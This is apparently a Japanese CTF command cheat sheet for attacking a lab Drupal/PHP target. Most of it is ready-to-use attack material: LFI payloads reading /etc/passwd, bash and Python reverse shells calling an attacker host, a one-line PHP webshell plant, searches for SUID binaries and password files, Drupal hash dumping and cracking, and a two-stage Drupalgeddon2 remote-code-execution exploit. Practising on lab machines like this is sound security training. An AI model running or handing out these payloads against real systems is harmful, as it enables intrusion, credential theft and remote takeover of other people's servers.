# TOOLS CHEATSHEET — CTF用コマンド早見表

## ターゲット発見

```bash
# 同一サブネット内のホスト一覧
sudo nmap -sn 192.168.56.0/24
# または
arp -a

# (VirtualBox Host-Only の典型: 192.168.56.0/24)
```

## ポートスキャン

```bash
# クイック
nmap <target>

# 全ポート + バージョン + デフォルトスクリプト (推奨)
nmap -p- -sV -sC -oN scan.txt <target>

# UDPもやる場合(時間かかる)
sudo nmap -sU --top-ports 50 <target>
```

## Web 列挙

```bash
# ディレクトリ列挙
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt
# 拡張子付き
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# robots.txt は最初に見る
curl http://<target>/robots.txt

# CMS / Webサーバー fingerprint
whatweb http://<target>/
curl -I http://<target>/

# ソースコメント・隠しコメント
curl -s http://<target>/ | grep -E "<!--|TODO|FIXME"
```

## LFI 攻撃パターン

```bash
# 直接読み取り (パラメータ脆弱)
curl "http://<target>/?page=/etc/passwd"
curl "http://<target>/?page=/etc/hosts"

# パストラバーサル
curl "http://<target>/?page=../../../etc/passwd"

# php://filter で PHP ソース読取(コードが実行される代わりに base64 で取れる)
curl "http://<target>/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d

# Apache ログ読取(ログポイズニング用)
curl "http://<target>/?page=/var/log/apache2/access.log"
```

## RCE ペイロード

```bash
# リバースシェル(Bash)
bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'

# リスナー(攻撃側)
nc -lvnp 4444

# Python ワンライナー reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'

# webshell 仕込み
echo '<?php system($_GET["c"]); ?>' > /var/www/html/x.php
# 利用: http://<target>/x.php?c=id
```

## 安定したシェル化(reverse shell をまともなTTYに)

```bash
# 接続後のシェル内で:
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z で一旦停止 → ホスト側で:
stty raw -echo; fg
# Enter 2回押す
```

## SSH

```bash
ssh user@<target>
# パスワード経由でホストキー警告無視(CTFのみ!)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@<target>

# SSH キーで入る
ssh -i id_rsa user@<target>
```

## ファイル探索 (post-exploitation)

```bash
# 世界書き込み可能
find / -perm -o+w -type f 2>/dev/null

# SUID バイナリ(典型的な privesc 経路)
find / -perm -u=s -type f 2>/dev/null

# 自分が読めるファイル + パスワードっぽいもの
find / -type f -readable 2>/dev/null | xargs grep -l -i "password\|credential\|secret" 2>/dev/null | head

# Drupal/WordPress の設定ファイル
find / -name "settings.php" -o -name "wp-config.php" 2>/dev/null
```

## 権限昇格

```bash
# 必ず最初にやる
sudo -l

# 現在のグループ・特殊権限
id

# 既知の privesc 自動診断
# linpeas.sh — github.com/carlospolop/PEASS-ng
curl -L https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh

# GTFOBins (sudo / SUID で root 取る方法集)
# https://gtfobins.github.io/
```

## パスワード関連

```bash
# Drupal 7 のハッシュ抽出 (DB アクセスできたら)
mysql -u drupal -p drupal_db -e "SELECT name, pass FROM users;"

# John でクラック
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat (GPU 速い)
hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
```

## Drupalgeddon2 ワンライナー

```bash
# 最小再現
curl -X POST 'http://<target>/blog/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id' \
  --data 'form_id=user_pass&_triggering_element_name=name'
# 注: form_build_id を再使用する2段階攻撃の方が確実(下記)

# 確実版(2段階)
TARGET=http://<target>/blog/
FBID=$(curl -s -X POST "${TARGET}?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
  -d 'form_id=user_pass&_triggering_element_name=name' \
  | grep -oP 'form_build_id" value="\K[^"]+' | head -1)
curl -X POST "${TARGET}?q=file/ajax/name/%23value/${FBID}" -d "form_build_id=${FBID}"
```

## 困った時

| 症状 | 試すこと |
|------|---------|
| ポートが空っぽ | nmap に `-Pn` 付ける(ICMP無効化されてる) |
| Webが見えない | 80/443以外の `8080`, `8000`, `8888` も試す |
| 「権限なし」連発 | `sudo -l`, `find / -perm` で別経路探す |
| シェルが不安定 | python pty + stty raw でフルTTYに |
| ヒント全部読んでも詰む | 朝まで寝て、もう一度最初から見直す。マジで |
